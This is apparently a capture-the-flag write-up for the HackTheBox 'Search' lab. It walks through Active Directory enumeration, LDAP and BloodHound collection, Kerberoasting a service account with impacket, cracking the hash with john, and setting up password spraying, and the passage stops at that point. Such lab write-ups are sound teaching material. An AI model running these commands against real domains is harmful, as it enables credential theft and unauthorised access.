# Search

## Introduction

Welcome to my another writeup! In this HackTheBox [Search](https://app.hackthebox.com/machines/Search) machine, you'll learn: Enumerating Active Directory via LDAP, BloodHound, Kerberoasting, password spraying, cracking digital certificate, abusing `ReadGMSAPassword` right, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★★★☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: Sierra.Frye to Tristan.Davies](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Search.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:05:44(HKT)]
└> export RHOSTS=10.10.11.129            
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:05:50(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-07-27 05:06:28Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-07-27T05:09:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738:614f:7bc0:29d0:6d1d:9ea6:3cdb:d99e
| SHA-1: 10ae:5494:29d6:1e44:276f:b8a2:24ca:fde9:de93:af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
[...]
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
443/tcp   open  ssl/http      syn-ack Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2023-07-27T05:09:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738:614f:7bc0:29d0:6d1d:9ea6:3cdb:d99e
| SHA-1: 10ae:5494:29d6:1e44:276f:b8a2:24ca:fde9:de93:af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
[...]
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-07-27T05:09:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738:614f:7bc0:29d0:6d1d:9ea6:3cdb:d99e
| SHA-1: 10ae:5494:29d6:1e44:276f:b8a2:24ca:fde9:de93:af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
[...]
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-07-27T05:09:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738:614f:7bc0:29d0:6d1d:9ea6:3cdb:d99e
| SHA-1: 10ae:5494:29d6:1e44:276f:b8a2:24ca:fde9:de93:af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
[...]
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-07-27T05:09:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=research
| Issuer: commonName=search-RESEARCH-CA/domainComponent=search
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-08-11T08:13:35
| Not valid after:  2030-08-09T08:13:35
| MD5:   0738:614f:7bc0:29d0:6d1d:9ea6:3cdb:d99e
| SHA-1: 10ae:5494:29d6:1e44:276f:b8a2:24ca:fde9:de93:af78
| -----BEGIN CERTIFICATE-----
| MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
[...]
| 7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
|_-----END CERTIFICATE-----
8172/tcp  open  ssl/http      syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
|_ssl-date: 2023-07-27T05:09:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Issuer: commonName=WMSvc-SHA2-RESEARCH
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-07T09:05:25
| Not valid after:  2030-04-05T09:05:25
| MD5:   eeb9:303e:6d46:bd8b:34a0:1ed6:0eb8:3287
| SHA-1: 1e06:9fd0:ef45:b051:78b2:c6bf:1bed:975e:a87d:0458
| -----BEGIN CERTIFICATE-----
| MIIC7TCCAdWgAwIBAgIQcJlfxrPWrqJOzFjgO04PijANBgkqhkiG9w0BAQsFADAe
[...]
| abMpffugMOPYnyHu8poRZWjKgNBN0ygmnqGbTjx57No5
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack Microsoft Windows RPC
49709/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**`nmap` UDP scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:11:59(HKT)]
└> sudo nmap -sU -F $RHOSTS  
[...]
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:12:31(HKT)]
└> sudo nmap -p123 -sU -sC -sV $RHOSTS 
[...]
PORT    STATE SERVICE VERSION
123/udp open  ntp     NTP v3
| ntp-info: 
|_  receive time stamp: 2023-07-27T05:12:34
```

**Add the found domain `search.htb` in `nmap`'s version scan (`-sV`) and `research` `CNAME` (Common Name) in SSL certificate:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:14:57(HKT)]
└> echo "$RHOSTS search.htb research.search.htb" | sudo tee -a /etc/hosts
10.10.11.129 search.htb research.search.htb
```

According to `rustscan` and `nmap` result, we have 21 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|53/TCP,UDP        | DNS                           |
|80/TCP            | Microsoft IIS httpd 10.0      |
|88/TCP            | Kerberos                      |
|123/UDP           | NTP v3                        |
|135/TCP, 593/TCP, 49667/TCP, 49675/TCP, 49676/TCP, 49698/TCP, 49709/TCP| RPC |
|139/TCP, 445/TCP  | netbios-ssn, SMB              |
|389/TCP, 636/TCP, 3268/TCP, 3269/TCP| LDAP, LDAPS |
|443/TCP           | Microsoft IIS httpd 10.0      |
|464/TCP           | Kerberos Password Change      |
|8172/TCP          | WMSVC                         |
|9389/TCP          | .NET Message Framing          |

Based on the scanned ports, the box appeared to be an **Active Directory's Domain Controller (DC)**.

### DNS on TCP/UDP port 53

**Try to get `ANY` records in domain `search.htb`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:20:16(HKT)]
└> dig -t ANY search.htb
[...]
;search.htb.			IN	ANY
[...]
```

Nothing...

### HTTP on TCP port 80

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727131548.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727131613.png)

It seems like a typical template website.

**Content discovery via `gobuster`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:17:12(HKT)]
└> gobuster dir -u http://search.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/css                  (Status: 301) [Size: 145] [--> http://search.htb/css/]
/images               (Status: 301) [Size: 148] [--> http://search.htb/images/]
/js                   (Status: 301) [Size: 144] [--> http://search.htb/js/]
/Images               (Status: 301) [Size: 148] [--> http://search.htb/Images/]
/fonts                (Status: 301) [Size: 147] [--> http://search.htb/fonts/]
/CSS                  (Status: 301) [Size: 145] [--> http://search.htb/CSS/]
/JS                   (Status: 301) [Size: 144] [--> http://search.htb/JS/]
/Js                   (Status: 301) [Size: 144] [--> http://search.htb/Js/]
/Css                  (Status: 301) [Size: 145] [--> http://search.htb/Css/]
/IMAGES               (Status: 301) [Size: 148] [--> http://search.htb/IMAGES/]
/Fonts                (Status: 301) [Size: 147] [--> http://search.htb/Fonts/]
/staff                (Status: 403) [Size: 1233]
/Staff                (Status: 403) [Size: 1233]
/STAFF                (Status: 403) [Size: 1233]
Progress: 23966 / 62285 (38.48%)[ERROR] 2023/07/27 13:18:11 [!] parse "http://search.htb/error\x1f_log": net/url: invalid control character in URL
/jS                   (Status: 301) [Size: 144] [--> http://search.htb/jS/]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:20:42(HKT)]
└> gobuster dir -u http://search.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 40
[...]
/index.html           (Status: 200) [Size: 44982]
/.                    (Status: 200) [Size: 44982]
/main.html            (Status: 200) [Size: 931]
/Index.html           (Status: 200) [Size: 44982]
/Main.html            (Status: 200) [Size: 931]
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:22:31(HKT)]
└> gobuster dir -u http://search.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 40 -x asp,aspx,txt,bak                     
[...]
/certsrv              (Status: 401) [Size: 1293]
```

**main.html:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:23:10(HKT)]
└> curl -s http://search.htb/main.html | html2text 
[Colorlib_logo]
****** Thank you for using our template! ******
For more awesome templates please visit Colorlib.

Copyright information for the template can't be altered/removed unless you
purchase a license.
Removing copyright information without the license will result in suspension of
your hosting and/or domain name(s).
More information about the license is available here.
```

It's just the Colorlib's thank you page.

**The `/staff` looks interesting, but it just returns "403 Forbidden" HTTP status code:** 
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:26:35(HKT)]
└> httpx http://search.htb/staff
HTTP/1.1 403 Forbidden
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Thu, 27 Jul 2023 05:26:35 GMT
Content-Length: 1233
[...]
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>403 - Forbidden: Access is denied.</h2>
  <h3>You do not have permission to view this directory or page using the credentials that you 
supplied.</h3>
 </fieldset></div>
</div>
</body>
</html>
```

Maybe we need to be authenticated?

The `/certsrv` is an endpoint that configures an HTTPS binding for the CA (Certification Authority), but it needs the Domain Admins credentials if I recalled correctly.

### LDAP(S) on TCP port 389, 636, 3268, 3269

**Try null credentials:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:38:59(HKT)]
└> ldapsearch -x -H ldap://$RHOSTS -D '' -w '' -b "DC=research,DC=search,DC=htb"
[...]
# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563
[...]
```

Nope.

### HTTPS on TCP port 443

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727134101.png)

Accept the certificate:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727134205.png)

The exact same web application in HTTP.

**Fuzzing subdomain:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:45:26(HKT)]
└> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://search.htb/ -H "Host: FUZZ.search.htb" -fw 13260
[...]
:: Progress: [114441/114441] :: Job [1/1] :: 401 req/sec :: Duration: [0:06:20] :: Errors: 0 ::
```

Nothing...

### SMB on TCP port 445

**Try to enumerate shares via guess login:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|13:27:45(HKT)]
└> smbclient -L //search.htb/ -U "%''"
session setup failed: NT_STATUS_LOGON_FAILURE
```

Nope. We need credentials.

## Initial Foothold

After enumerated every single thing I could ever think of, I then decided to read the official writeup. Indeed, I missed something.

**In the web application, the "Our Features" section has an image that contains credentials??**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727142811.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727143133.png)

What???

```
Send password to Hope Sharp
{Redacted}
```

**Armed with above information, we can use LDAP or SMB to check the credentials are valid.**

However, we might be locked out to an account due to the password policy in the Group Policy. So, it's recommended to do it in LDAP.

**After some guessing, the user Hope Sharp's username is `hope.sharp`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|15:00:03(HKT)]
└> ldapsearch -x -H ldap://$RHOSTS -D 'hopesharp@search.htb' -w '{Redacted}' -b "DC=search,DC=htb"
ldap_bind: Invalid credentials (49)
	additional info: 80090308: LdapErr: DSID-0C090439, comment: AcceptSecurityContext error, data 52e, v4563
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|15:00:05(HKT)]
└> ldapsearch -x -H ldap://$RHOSTS -D 'hope.sharp@search.htb' -w '{Redacted}' -b "DC=search,DC=htb"
[...]
# search.htb
dn: DC=search,DC=htb
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=search,DC=htb
instanceType: 5
whenCreated: 20200331141828.0Z
whenChanged: 20230727050339.0Z
subRefs: DC=ForestDnsZones,DC=search,DC=htb
subRefs: DC=DomainDnsZones,DC=search,DC=htb
subRefs: CN=Configuration,DC=search,DC=htb
[...]
```

Which means the **username schema is `<First_Name>.<Last_Name>`**.

Now, since we found valid credentials, we can enumerate the Active Directory environment much deeper.

**Extract domain users:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|15:01:34(HKT)]
└> ldapsearch -x -H ldap://$RHOSTS -D 'hope.sharp@search.htb' -w '{Redacted}' -b "CN=Users,DC=search,DC=htb"
[...]
# Users, search.htb
dn: CN=Users,DC=search,DC=htb
objectClass: top
[...]
```

However, that would take a long time to enumerate.

**To automate this process, we can use a tool called `ldapdomaindump`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|15:03:35(HKT)]
└> ldapdomaindump $RHOSTS -u 'search.htb\hope.sharp' -p '{Redacted}'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|15:03:45(HKT)]
└> file domain_*             
domain_computers_by_os.html: HTML document, ASCII text, with very long lines (345)
domain_computers.grep:       ASCII text
domain_computers.html:       HTML document, ASCII text, with very long lines (345)
domain_computers.json:       JSON text data
domain_groups.grep:          ASCII text, with very long lines (472)
domain_groups.html:          HTML document, ASCII text, with very long lines (578)
domain_groups.json:          JSON text data
domain_policy.grep:          ASCII text
domain_policy.html:          HTML document, ASCII text, with very long lines (398)
domain_policy.json:          JSON text data
domain_trusts.grep:          ASCII text, with no line terminators
domain_trusts.html:          HTML document, ASCII text
domain_trusts.json:          JSON text data
domain_users_by_group.html:  HTML document, ASCII text, with very long lines (477)
domain_users.grep:           ASCII text, with very long lines (370)
domain_users.html:           HTML document, ASCII text, with very long lines (1194)
domain_users.json:           JSON text data
```

**Domain users:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727150451.png)

**In here, we saw some interesting domain users:**

|SAM Name|Member of groups|Description|
|---|---|---|
|Tristan.Davies|Domain Admins|The only Domain Admin allowed, Administrator will soon be disabled
|web_svc|Domain Users|Temp Account created by HelpDesk|

So, our final goal should be escalate our privilege to Domain Admin `Tristan.Davies` and fully compromise the Domain Controller.

**Domain policy:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727153406.png)

As you can see, the domain doesn't have set the password policy to lockout accounts.

**Domain computers:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727153616.png)

There are 2 computers in the domain:

- Windows 10 Pro: `Covid.search.htb`
- Windows Server 2019 Standard: `Research.search.htb` (DC)

**Since we found a domain user's credentials, we can now enumerate SMB shares:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|15:38:56(HKT)]
└> smbclient -L //search.htb/ -U "hope.sharp"
Password for [WORKGROUP\hope.sharp]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	helpdesk        Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	RedirectedFolders$ Disk      
	SYSVOL          Disk      Logon server share 
```

- Found non-default SMB shares: `CertEnroll`, `helpdesk`, `RedirectedFolders$`

**In share `RedirectedFolders$`, we can view `hope.sharp` domain user's profile:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|15:41:11(HKT)]
└> smbclient //search.htb/RedirectedFolders$ -U "hope.sharp"
Password for [WORKGROUP\hope.sharp]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  Dc        0  Tue Aug 11 19:39:13 2020
  ..                                 Dc        0  Tue Aug 11 19:39:13 2020
  abril.suarez                       Dc        0  Wed Apr  8 02:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 21:11:32 2020
[...]
smb: \> cd hope.sharp\
smb: \hope.sharp\> dir
  .                                  Dc        0  Thu Apr  9 22:34:41 2020
  ..                                 Dc        0  Thu Apr  9 22:34:41 2020
  Desktop                           DRc        0  Thu Apr  9 22:35:49 2020
  Documents                         DRc        0  Thu Apr  9 22:35:50 2020
  Downloads                         DRc        0  Thu Apr  9 22:35:49 2020
smb: \hope.sharp\> cd Downloads\
smb: \hope.sharp\Downloads\> dir
  .                                 DRc        0  Thu Apr  9 22:35:49 2020
  ..                                DRc        0  Thu Apr  9 22:35:49 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 22:35:49 2020
  desktop.ini                      AHSc      282  Thu Apr  9 22:35:02 2020
smb: \hope.sharp\Downloads\> cd ..\Desktop\
smb: \hope.sharp\Desktop\> dir
  .                                 DRc        0  Thu Apr  9 22:35:49 2020
  ..                                DRc        0  Thu Apr  9 22:35:49 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 22:35:49 2020
  desktop.ini                      AHSc      282  Thu Apr  9 22:35:00 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 22:35:38 2020
smb: \hope.sharp\Desktop\> cd ..\Documents\
smb: \hope.sharp\Documents\> dir
  .                                 DRc        0  Thu Apr  9 22:35:50 2020
  ..                                DRc        0  Thu Apr  9 22:35:50 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 22:35:51 2020
  desktop.ini                      AHSc      402  Thu Apr  9 22:35:03 2020
```

But nothing useful...

**Then I tried to use `impacket-psexec` to gain initial foothold, but no dice:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|15:45:43(HKT)]
└> impacket-psexec research.search.htb/hope.sharp:{Redacted}@research.search.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on research.search.htb.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'CertEnroll' is not writable.
[-] share 'helpdesk' is not writable.
[-] share 'NETLOGON' is not writable.
[*] Found writable share RedirectedFolders$
[*] Uploading file mviCJdyM.exe
[*] Opening SVCManager on research.search.htb.....
[-] Error opening SVCManager on research.search.htb.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager
```

**Moreover, we can also use user `hope.sharp`'s credentials to use [bloodhound.py](https://github.com/fox-it/BloodHound.py) to collect and analyze all information about the Active Directory environment:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|15:57:07(HKT)]
└> bloodhound-python -u hope.sharp -p '{Redacted}' -ns $RHOSTS -d search.htb -c all
INFO: Found AD domain: search.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 113 computers
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 107 users
INFO: Found 64 groups
INFO: Found 6 gpos
INFO: Found 27 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Windows-100.search.htb
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|15:58:45(HKT)]
└> file 202307271557*
20230727155709_computers.json:  JSON text data
20230727155709_containers.json: JSON text data
20230727155709_domains.json:    JSON text data
20230727155709_gpos.json:       JSON text data
20230727155709_groups.json:     JSON text data
20230727155709_ous.json:        JSON text data
20230727155709_users.json:      JSON text data
20230727155758_computers.json:  JSON text data
20230727155758_containers.json: JSON text data
20230727155758_domains.json:    JSON text data
20230727155758_gpos.json:       JSON text data
20230727155758_groups.json:     JSON text data
20230727155758_ous.json:        JSON text data
20230727155758_users.json:      JSON text data
```

**View the collected data visually:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:00:15(HKT)]
└> sudo neo4j start
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /usr/share/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /usr/share/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /usr/share/neo4j/run
Starting Neo4j.
Started neo4j (pid:237440). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:00:38(HKT)]
└> bloodhound

```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727160106.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727160332.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727160337.png)

**After poking around at the data a little bit, I found that `web_svc` domain user account is Kerberoastable:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727161047.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Search/images/Pasted%20image%2020230727161420.png)

> The goal of **Kerberoasting** is to harvest **TGS tickets for services that run on behalf of user accounts** in the AD, not computer accounts. Thus, **part** of these TGS **tickets are encrypted** with **keys** derived from user passwords. As a consequence, their credentials could be **cracked offline**. You can know that a **user account** is being used as a **service** because the property **"ServicePrincipalName"** is **not null**.
>  
> Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required. (From [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast))

That being said, domain user `hope.sharp` can request a Kerberos ticket for an SPN (Service Principal Name), which is the `web_svc` **service**. (`web_svc` **user account** is being used as a **service**.)

**To request a Kerberos ticket for `web_svc` service, we can use [impacket](https://github.com/fortra/impacket)'s `GetUserSPNs.py`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:18:24(HKT)]
└> impacket-GetUserSPNs -request -dc-ip $RHOSTS search.htb/hope.sharp -outputfile web_svc.kerberoast
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 20:59:11.329031  <never>               
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:18:49(HKT)]
└> file web_svc.kerberoast                                  
web_svc.kerberoast: ASCII text, with very long lines (2175)
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:18:50(HKT)]
└> cat web_svc.kerberoast 
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$c3cc[...]
```

**Then, we can crack the hash offline via `john`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:19:49(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs web_svc.kerberoast 
[...]
{Redacted} (?)     
[...]
```

Nice! We cracked it!

**We can try to verify that credentials:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:28:14(HKT)]
└> smbclient -L //search.htb/ -U "web_svc"               
Password for [WORKGROUP\web_svc]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	helpdesk        Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	RedirectedFolders$ Disk      
	SYSVOL          Disk      Logon server share 
[...]
```

It worked! Which means we can use `web_svc`'s credentials to authenticate to the domain.

I also tried `psexec` with `web_svc` service account, but no dice again.

Now, let's take a step back.

We've gathered 2 valid domain users' credentials: `hope.sharp` and `web_svc`. We also found all domain users in the domain.

Hmm... Let's perform **password spraying**! Maybe someone reused the above domain users' password.

- Create domain users wordlist:

**In the previous `ldapdomaindump`, it also dumped the JSON version of the data, we can easily extract domain users via `jq`:** 
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:35:05(HKT)]
└> cat domain_users.json | jq -r '.[].attributes.sAMAccountName[]' > domain_users.txt
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:35:28(HKT)]
└> head domain_users.txt 
Tristan.Davies
web_svc
Jordan.Gregory
Claudia.Pugh
Angie.Duffy
Kaylin.Bird
Isabela.Estrada
Haven.Summers
Kayley.Ferguson
Crystal.Greer
```

- Create `hope.sharp` and `web_svc` password wordlist:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:36:44(HKT)]
└> cat << EOF > domain_users_password.txt
then> {Redacted}
then> {Redacted}
then> EOF
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Search)-[2023.07.27|16:37:11(HKT)]
└> head domain_users_password.txt 
